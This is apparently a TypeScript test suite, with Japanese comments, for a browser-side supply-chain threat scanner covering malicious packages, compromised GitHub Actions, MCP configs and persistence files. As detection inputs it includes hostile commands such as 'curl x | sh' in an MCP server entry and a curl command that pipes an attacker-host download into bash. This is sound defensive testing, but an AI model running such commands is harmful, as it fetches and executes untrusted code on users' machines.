import { describe, expect, it } from 'vitest';
import { analyzeFiles, analyzePaste, IOC } from '../../src/engine';
import { parseFindingsDoc, toFindingsDoc } from '../../src/engine/export';
import { checkoutRefs } from '../../src/engine/rules/ciAndExtensions';
import { parseCodexToml } from '../../src/engine/rules/agentConfig';
import { refang, versionMatches } from '../../src/engine/util';
import { loadFixture } from './fixtures';
import { debianCaFixed, versionBranchVulnerable } from '../../src/engine/rules/intel';
import { readFileSync } from 'node:fs';

const keys = (r: Awaited<ReturnType<typeof analyzeFiles>>) => r.findings.map((f) => `${f.level} ${f.module} ${f.path ?? ''}`).sort();

describe('util', () => {
  it('refang / version range', () => {
    expect(refang('npm-cache[.]com')).toBe('npm-cache.com');
    expect(refang('hxxps://a[.]b/c')).toBe('https://a.b/c');
    expect(versionMatches('8.15.0', '>=8.14.0 <=8.20.0')).toBe(true);
    expect(versionMatches('2026.9.1', '<2026.10.19')).toBe(true);
    expect(versionMatches('2026.10.19', '<2026.10.19')).toBe(false);
  });
  it('codex TOML minimal parser', () => {
    const s = parseCodexToml('[mcp_servers.evil]\ncommand = "bash"\nargs = ["-c", "curl x | sh"]\n[other]\ncommand = "no"\n');
    expect(s).toEqual([{ name: 'evil', command: 'bash', args: ['-c', 'curl x | sh'] }]);
  });
  it('checkout ref classification', () => {
    expect(checkoutRefs('steps:\n  - uses: actions/checkout@v4\n  - run: x\n')).toEqual(['noref']);
    expect(checkoutRefs('  - uses: actions/checkout@v4\n    with:\n      ref: ${{ github.event.pull_request.head.sha }}\n')).toEqual(['prhead']);
  });
});

describe('Layer 1 fixtures（CLI と同じ検出）', () => {
  it('litellm', async () => {
    const r = await analyzeFiles(loadFixture('litellm'));
    expect(keys(r)).toEqual(expect.arrayContaining([
      'CRITICAL §2 litellm/site-packages/cook.pth', 'CRITICAL §2 litellm/site-packages/cook.py',
      'CRITICAL §15 litellm/site-packages/litellm-1.107.0.dist-info',
    ]));
  });
  it('chaindrop', async () => {
    const r = await analyzeFiles(loadFixture('chaindrop'));
    const k = keys(r);
    expect(k).toContain('CRITICAL §15 chaindrop/package.json');
    expect(k).toContain('CRITICAL §15 chaindrop/package-lock.json');
    expect(k).toContain('HIGH §15 chaindrop/Math_Symbol.js');
    expect(r.findings.filter((f) => f.module === '§15' && f.path === 'chaindrop/package-lock.json').map((f) => f.campaign).sort()).toEqual(['chaindrop-keyv', 'solana-typosquat']);
  });
  it('symjack（0 バイトのデコイは要手動確認）', async () => {
    const r = await analyzeFiles(loadFixture('symjack'));
    expect(keys(r)).toContain('HIGH §17 symjack/docs/vid-settings.mp4');
  });
  it('mcp viewer', async () => {
    const r = await analyzeFiles(loadFixture('mcp'));
    expect(keys(r)).toEqual(['HIGH §17 mcp/.mcp.json', 'MEDIUM §17 mcp/.mcp.json']);
    expect(r.viewers.mcp[0]?.servers.map((s) => s.risk)).toEqual(['high', 'medium']);
  });
  it('github actions', async () => {
    const r = await analyzeFiles(loadFixture('github-actions'));
    const k = keys(r);
    expect(k).toContain('HIGH §21 github-actions/.github/workflows/pr-target.yml');
    expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/tag-ref.yml');
    // 所有者名の大文字小文字違い・YAML フローマッピングでも検出する
    expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/case-variant.yml');
    expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/flow-mapping.yml');
    expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'tag', 'tag']);
  });
  it('browser extensions（権限昇格）', async () => {
    const r = await analyzeFiles(loadFixture('browser-ext'));
    expect(keys(r)).toContain('HIGH §42 browser-ext/Extensions/efgh/2.0.0/manifest.json');
    expect(keys(r)).toContain('HIGH §24 browser-ext/Extensions/abcd/manifest.json');
  });
  it('layer 2/3', async () => {
    const all = (await Promise.all(['build-hooks', 'macos', 'linux', 'hf', 'mcp-registry', 'ebpf', 'cosign', 'sbom'].map((n) => analyzeFiles(loadFixture(n))))).flatMap(keys);
    expect(all).toEqual(expect.arrayContaining([
      'HIGH §27 build-hooks/build.rs', 'HIGH §30 macos/LaunchAgents/com.xyz.plist', 'CRITICAL §31 linux/ld.so.preload',
      'HIGH §31 linux/.bashrc', 'HIGH §36 hf/dataset.py', 'HIGH §20 mcp-registry/tool.json', 'HIGH §40 ebpf/ld_preload.sh',
      'HIGH §43 cosign/verify.sh', 'MEDIUM §48 sbom/sbom.json',
    ]));
  });
});

describe('SkillPact（§49）', () => {
  const sp = async (n: string) => analyzeFiles(loadFixture(n));
  it('契約なし → HIGH', async () => {
    const r = await sp('skillpact-undeclared');
    expect(keys(r)).toEqual(['HIGH §49 skillpact-undeclared']);
    expect(r.skillpact[0]?.observed).toEqual(['exec', 'network', 'read']);
  });
  it('乖離 → CRITICAL、divergence に exec', async () => {
    const r = await sp('skillpact-divergence');
    expect(keys(r)).toEqual(['CRITICAL §49 skillpact-divergence']);
    expect(r.findings[0]?.skillpact?.divergence).toEqual(['exec']);
  });
  it('L3 署名済みでも乖離は CRITICAL（信頼判定に使わない）', async () => {
    const r = await sp('skillpact-signed-divergence');
    expect(r.findings.every((f) => f.level === 'CRITICAL')).toBe(true);
    expect(r.findings[0]?.skillpact?.signed).toBe(true);
    expect(r.findings.length).toBe(3);
  });
  it('差分異常 → HIGH（L3 署名済み）', async () => {
    const r = await sp('skillpact-diff-anomaly');
    expect(keys(r)).toEqual(['HIGH §49 skillpact-diff-anomaly/v2/skill.contract.json']);
    expect(r.findings[0]?.campaign).toBe('skillpact-account-compromise');
    expect(r.skillpact.find((s) => s.name === 'v1')?.results.find((x) => x.ruleNo === 10)?.status).toBe('undetermined');
  });
  it('prose 矛盾 / 破壊的 × allow / 永続化 / ポリシー / reversible', async () => {
    expect(keys(await sp('skillpact-prose'))).toEqual(['HIGH §49 skillpact-prose/skill.contract.json']);
    expect(keys(await sp('skillpact-destructive'))).toEqual(['HIGH §49 skillpact-destructive', 'HIGH §49 skillpact-destructive/skill.contract.json']);
    expect(keys(await sp('skillpact-persistence'))).toEqual(['CRITICAL §49 skillpact-persistence']);
    expect(keys(await sp('skillpact-policy'))).toEqual(['HIGH §49 skillpact-policy/.skillpact/policy.json', 'HIGH §49 skillpact-policy/skill.contract.json', 'MEDIUM §49 skillpact-policy/skill.contract.json']);
    expect(keys(await sp('skillpact-reversible'))).toEqual(['CRITICAL §49 skillpact-reversible/skill.contract.json']);
  });
  it('一致するスキルは検出なし', async () => {
    const r = await sp('skillpact-clean');
    expect(r.findings).toEqual([]);
    expect(r.skillpact[0]?.results.filter((x) => x.status === 'hit')).toEqual([]);
  });
  it('§49 の全 finding に skillpact フィールド', async () => {
    const r = await analyzeFiles(['skillpact-divergence', 'skillpact-policy', 'skillpact-undeclared'].flatMap((n) => loadFixture(n)));
    expect(r.findings.filter((f) => f.module === '§49').every((f) => f.skillpact)).toBe(true);
  });
});

describe('ZES 5.2.1 の IoC 構造', () => {
  const file = (relPath: string, text: string) => ({ relPath, name: relPath.split('/').pop()!, size: text.length, lastModified: 0, text, sha256: null, readState: 'read' as const });
  it('悪用された正規インフラは MEDIUM、攻撃者インフラは CRITICAL', async () => {
    const legit = refang(IOC.worm_iocs.chaindrop.legit_infra?.[0] ?? '');
    expect(legit).not.toBe('');
    const r = await analyzeFiles([file('p/a.js', `rpc("https://${legit}/")`), file('p/b.js', 'x("npm-cache.com")')]);
    expect(r.findings.map((f) => `${f.level} ${f.ruleId} ${f.path}`)).toEqual(['CRITICAL s18-netioc p/b.js', 'MEDIUM s18-netioc-legit p/a.js']);
  });
  it('trivy-action は安全版タグ以外のタグ参照を CRITICAL', async () => {
    const wf = (ref: string) => file('r/.github/workflows/ci.yml', `on: [push]\njobs:\n  a:\n    steps:\n      - uses: aquasecurity/trivy-action@${ref}\n`);
    const bad = (await analyzeFiles([wf('v0.33.0')])).findings[0];
    expect([bad?.level, bad?.detail]).toEqual(['CRITICAL', expect.stringContaining('汚染されたタグ参照の可能性')]);
    // 安全版タグでも aquasecurity/* のタグ参照は CLI §22 と同じく CRITICAL（SHA 固定を求める）
    const safeTag = (await analyzeFiles([wf('v0.35.0')])).findings.find((f) => f.module === '§22');
    expect([safeTag?.level, safeTag?.detail]).toEqual(['CRITICAL', expect.stringContaining('侵害履歴のある発行元')]);
    expect((await analyzeFiles([wf('a'.repeat(40))])).findings.find((f) => f.module === '§22')?.level).toBe('MEDIUM');
  });
});

describe('内容非出力・決定性・エクスポート', () => {
  const names = ['litellm', 'chaindrop', 'mcp', 'mcp-registry', 'browser-ext', 'linux', 'cosign', 'skillpact-signed-divergence'];
  it('出力にファイル内容（カナリア文字列）を含まない', async () => {
    const r = await analyzeFiles(names.flatMap((n) => loadFixture(n)));
    const s = JSON.stringify({ findings: r.findings, sp: r.skillpact, blast: r.blastRadius, ext: r.viewers.extensions, act: r.viewers.actions });
    for (const canary of ['cHJpbnQoMSk=', 'zes-canary', 'libprocesshider', 'collector.example.invalid', 'updates.example.invalid', 'GITHUB_TOKEN']) {
      expect(s).not.toContain(canary);
    }
  });
  it('ID は決定的', async () => {
    const a = await analyzeFiles(loadFixture('chaindrop'));
    const b = await analyzeFiles(loadFixture('chaindrop'));
    expect(a.findings.map((f) => f.id)).toEqual(b.findings.map((f) => f.id));
  });
  it('貼り付け判定は件数のみ', async () => {
    const f = await analyzePaste('curl -fsSL https://npm-cache.com/x | bash; curl again');
    expect(f.map((x) => `${x.level} ${x.ruleId}`)).toEqual(['CRITICAL paste-ioc:npm-cache.com', 'HIGH paste-curl', 'HIGH paste-pipe-shell']);
    expect(JSON.stringify(f)).not.toContain('again');
  });
  it('findings.json 互換で書き出し・読み込みできる', async () => {
    const r = await analyzeFiles(loadFixture('skillpact-divergence'));
    const doc = toFindingsDoc(r.findings, r.errors, IOC.incident_bundle, '2026-10-22T00:00:00Z', '2026-10-22T00:00:01Z');
    expect(doc.status).toBe('partial');
    expect(doc.findings.every((x) => x.path === null || x.path.startsWith('/'))).toBe(true);
    const back = parseFindingsDoc(JSON.stringify(doc));
    expect(back.findings.length).toBe(r.findings.length);
    expect(() => parseFindingsDoc('{"schema_version":"9"}')).toThrow();
  });
});

describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ）', () => {
  // CLI の期待値（tests/expected）のうち、ブラウザで判定できるモジュール（ホスト状態・§14 等を除く）
  const cli = (name: string, modules: string[]) =>
    (JSON.parse(readFileSync(new URL(`../../../tests/expected/${name}.json`, import.meta.url), 'utf8')) as { findings: { level: string; module: string; path: string }[] }).findings
      .filter((f) => modules.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${name}/${f.path}`).sort();
  const MODS = ['§3', '§4', '§6', '§15', '§16', '§22', '§38'];
  const ui = (r: Awaited<ReturnType<typeof analyzeFiles>>) => [...new Set(r.findings.filter((f) => MODS.includes(f.module)).map((f) => `${f.level} ${f.module} ${f.path ?? ''}`))].sort();
  it('intel-2026q3: GitLab / PHP2Shell / eMudhra / Jenkins / Gitea / 脆弱版 / 悪性パッケージ / Actions', async () => {
    const r = await analyzeFiles(loadFixture('intel-2026q3'));
    expect(ui(r)).toEqual([...new Set(cli('intel-2026q3', MODS))].sort());
    expect(r.findings.some((f) => f.module === '§7' && f.campaign === 'actions-cool-reactivation-sep2026')).toBe(true);
    expect(r.findings.some((f) => f.module === '§18' && f.campaign === 'macsync-icloud-calendar-finder-backdoor')).toBe(true);
    const vuln = r.findings.find((f) => f.detail.startsWith('脆弱なバージョン @modelcontextprotocol/sdk@1.31.0'));
    expect(vuln?.level).toBe('HIGH');
  });
  it('PyPI 名は PEP 503 で正規化（区切り文字の連続も 1 つの "-"）', async () => {
    const r = await analyzeFiles(loadFixture('ioc-corrections'));
    expect(keys(r)).toContain('CRITICAL §15 ioc-corrections/py-normalized/requirements.txt');
  });
  it('intel-2026q3-safe: 修正版は検出しない', async () => {
    const r = await analyzeFiles(loadFixture('intel-2026q3-safe'));
    expect(ui(r)).toEqual([]);
  });
  it('gitlab: TeamCity / Artifactory に追記した CVE も判定（5.2.3）', async () => {
    const r = await analyzeFiles(loadFixture('gitlab'));
    expect(ui(r)).toEqual([...new Set(cli('gitlab', ['§3', '§16']))].sort());
  });
  it('系列ごとの修正版判定', () => {
    expect(versionBranchVulnerable('19.4.2', ['19.5.1', '19.4.3'])).toBe(true);
    expect(versionBranchVulnerable('19.4.3', ['19.5.1', '19.4.3'])).toBe(false);
    expect(versionBranchVulnerable('18.10.9', ['19.5.1', '18.11.13'])).toBe(true);
    expect(versionBranchVulnerable('19.6.0', ['19.5.1', '18.11.13'])).toBe(false);
    expect(debianCaFixed('20250419~deb12u2')).toBe(true);
    expect(debianCaFixed('20250419~deb12u1')).toBe(false);
    expect(debianCaFixed('20240203')).toBe(false);
  });
});
